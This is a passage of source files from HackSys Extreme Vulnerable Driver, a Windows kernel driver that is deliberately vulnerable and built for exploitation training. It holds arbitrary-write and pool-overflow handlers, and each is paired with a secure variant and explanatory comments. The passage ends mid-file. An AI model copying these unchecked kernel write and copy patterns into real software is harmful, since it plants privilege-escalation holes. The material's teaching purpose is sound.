`Driver/HEVD/Windows/ArbitraryWrite.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryWrite.c

Abstract:
    This module implements the functions to demonstrate
    arbitrary write vulnerability.

--*/

#include "ArbitraryWrite.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerArbitraryWrite)
#pragma alloc_text(PAGE, ArbitraryWriteIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the Arbitrary Write Vulnerability
/// </summary>
/// <param name="UserWriteWhatWhere">The pointer to WRITE_WHAT_WHERE structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerArbitraryWrite(
    _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere
)
{
    PULONG_PTR What = NULL;
    PULONG_PTR Where = NULL;
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead((PVOID)UserWriteWhatWhere, sizeof(WRITE_WHAT_WHERE), (ULONG)__alignof(UCHAR));

        What = UserWriteWhatWhere->What;
        Where = UserWriteWhatWhere->Where;

        DbgPrint("[+] UserWriteWhatWhere: 0x%p\n", UserWriteWhatWhere);
        DbgPrint("[+] WRITE_WHAT_WHERE Size: 0x%zX\n", sizeof(WRITE_WHAT_WHERE));
        DbgPrint("[+] UserWriteWhatWhere->What: 0x%p\n", What);
        DbgPrint("[+] UserWriteWhatWhere->Where: 0x%p\n", Where);

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is properly validating if address
        // pointed by 'Where' and 'What' value resides in User mode by calling ProbeForRead()/
        // ProbeForWrite() routine before performing the write operation
        //

        ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR));
        ProbeForWrite((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR));

        *(Where) = *(What);
#else
        DbgPrint("[+] Triggering Arbitrary Write\n");

        //
        // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability
        // because the developer is writing the value pointed by 'What' to memory location
        // pointed by 'Where' without properly validating if the values pointed by 'Where'
        // and 'What' resides in User mode
        //

        *(Where) = *(What);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    //
    // There is one more hidden vulnerability. Find it out.
    //

    return Status;
}


/// <summary>
/// Arbitrary Write Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
ArbitraryWriteIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PWRITE_WHAT_WHERE UserWriteWhatWhere = NULL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserWriteWhatWhere = (PWRITE_WHAT_WHERE)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserWriteWhatWhere)
    {
        Status = TriggerArbitraryWrite(UserWriteWhatWhere);
    }

    return Status;
}

```

`Driver/HEVD/Windows/ArbitraryWrite.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryWrite.h

Abstract:
    This module implements the data structures for
    arbitrary write module.

--*/

#pragma once

#ifndef __ARBITRARY_WRITE_H__
#define __ARBITRARY_WRITE_H__

#include "Common.h"


//
// Structures
//

typedef struct _WRITE_WHAT_WHERE
{
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;


//
// Function Definitions
//

NTSTATUS
TriggerArbitraryWrite(
    _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere
);

#endif // !__ARBITRARY_WRITE_H__

```

`Driver/HEVD/Windows/BufferOverflowNonPagedPool.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowNonPagedPool.c

Abstract:
    This module implements the functions to demonstrate
    buffer overflow in NonPagedPool vulnerability.

--*/

#include "BufferOverflowNonPagedPool.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerBufferOverflowNonPagedPool)
#pragma alloc_text(PAGE, BufferOverflowNonPagedPoolIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the buffer overflow in NonPagedPool Vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <param name="Size">Size of the user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerBufferOverflowNonPagedPool(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
)
{
    PVOID KernelBuffer = NULL;
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Allocating Pool chunk\n");

        //
        // Allocate Pool chunk
        //

        KernelBuffer = ExAllocatePoolWithTag(
            NonPagedPool,
            (SIZE_T)POOL_BUFFER_SIZE,
            (ULONG)POOL_TAG
        );

        if (!KernelBuffer)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
        }

        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%zX\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of the allocated pool chunk to RtlCopyMemory()/memcpy().
        // Hence, there will be no overflow
        //

        RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE);
#else
        DbgPrint("[+] Triggering Buffer Overflow in NonPagedPool\n");

        //
        // Vulnerability Note: This is a vanilla pool buffer overflow vulnerability
        // because the developer is passing the user supplied value directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of the allocated Pool chunk
        //

        RtlCopyMemory(KernelBuffer, UserBuffer, Size);
#endif

        if (KernelBuffer)
        {
            DbgPrint("[+] Freeing Pool chunk\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);

            //
            // Free the allocated Pool chunk
            //

            ExFreePoolWithTag(KernelBuffer, (ULONG)POOL_TAG);
            KernelBuffer = NULL;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Buffer Overflow NonPagedPool Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
BufferOverflowNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowNonPagedPool(UserBuffer, Size);
    }

    return Status;
}

```

`Driver/HEVD/Windows/BufferOverflowNonPagedPool.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowNonPagedPool.h

Abstract:
    This module implements the data structures for
    buffer overflow in NonPagedPool module.

--*/

#pragma once

#ifndef __BUFFER_OVERFLOW_NON_PAGED_POOL_H__
#define __BUFFER_OVERFLOW_NON_PAGED_POOL_H__

#include "Common.h"


//
// Defines
//

#define POOL_BUFFER_SIZE 504


//
// Function Definitions
//

NTSTATUS
TriggerBufferOverflowNonPagedPool(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
);

#endif  // !__BUFFER_OVERFLOW_NON_PAGED_POOL_H__

```

`Driver/HEVD/Windows/BufferOverflowNonPagedPoolNx.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowNonPagedPoolNx.c

Abstract:
    This module implements the functions to demonstrate
    buffer overflow in NonPagedPoolNx vulnerability.

--*/

#include "BufferOverflowNonPagedPoolNx.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerBufferOverflowNonPagedPoolNx)
#pragma alloc_text(PAGE, BufferOverflowNonPagedPoolNxIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the buffer overflow in NonPagedPoolNx vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <param name="Size">Size of the user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerBufferOverflowNonPagedPoolNx(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
)
{
    PVOID KernelBuffer = NULL;
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Allocating Pool chunk\n");

        //
        // Allocate Pool chunk
        //

        KernelBuffer = ExAllocatePoolWithTag(
            NonPagedPoolNx,
            (SIZE_T)POOL_BUFFER_SIZE,
            (ULONG)POOL_TAG
        );

        if (!KernelBuffer)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPoolNx));
            DbgPrint("[+] Pool Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
        }

        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%zX\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().
        // Hence, there will be no overflow
        //

        RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE);
#else
        DbgPrint("[+] Triggering Buffer Overflow in NonPagedPoolNx\n");

        //
        // Vulnerability Note: This is a vanilla Pool Based Overflow vulnerability
        // because the developer is passing the user supplied value directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of the allocated Pool chunk
        //

        RtlCopyMemory(KernelBuffer, UserBuffer, Size);
#endif

        if (KernelBuffer)
        {
            DbgPrint("[+] Freeing Pool chunk\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);

            //
            // Free the allocated Pool chunk
            //

            ExFreePoolWithTag(KernelBuffer, (ULONG)POOL_TAG);
            KernelBuffer = NULL;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Buffer Overflow NonPagedPoolNx Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
BufferOverflowNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowNonPagedPoolNx(UserBuffer, Size);
    }

    return Status;
}

```

`Driver/HEVD/Windows/BufferOverflowNonPagedPoolNx.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowNonPagedPoolNx.h

Abstract:
    This module implements the data structures for
    buffer overflow in NonPagedPoolNx module.

--*/

#pragma once

#ifndef __BUFFER_OVERFLOW_NON_PAGED_POOL_NX_H__
#define __BUFFER_OVERFLOW_NON_PAGED_POOL_NX_H__

#include "Common.h"


//
// Defines
//

#ifdef _WIN64
#define POOL_BUFFER_SIZE 496
#else
#define POOL_BUFFER_SIZE 504
#endif


//
// Function Definitions
//

NTSTATUS
TriggerBufferOverflowNonPagedPoolNx(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
);

#endif  // !__BUFFER_OVERFLOW_NON_PAGED_POOL_NX_H__

```

`Driver/HEVD/Windows/BufferOverflowPagedPoolSession.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowPagedPoolSession.c

Abstract:
    This module implements the functions to demonstrate
    buffer overflow in PagedPoolSession vulnerability.

--*/

#include "BufferOverflowPagedPoolSession.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerBufferOverflowPagedPoolSession)
#pragma alloc_text(PAGE, BufferOverflowPagedPoolSessionIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the buffer overflow in PagedPoolSession vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <param name="Size">Size of the user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerBufferOverflowPagedPoolSession(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
)
{
    PVOID KernelBuffer = NULL;
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Allocating Pool chunk\n");

        //
        // Allocate Pool chunk
        //

        KernelBuffer = ExAllocatePoolWithTag(
            PagedPoolSession,
            (SIZE_T)POOL_BUFFER_SIZE,
            (ULONG)POOL_TAG
        );

        if (!KernelBuffer)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(PagedPoolSession));
            DbgPrint("[+] Pool Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
        }

        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%zX\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().
        // Hence, there will be no overflow
        //

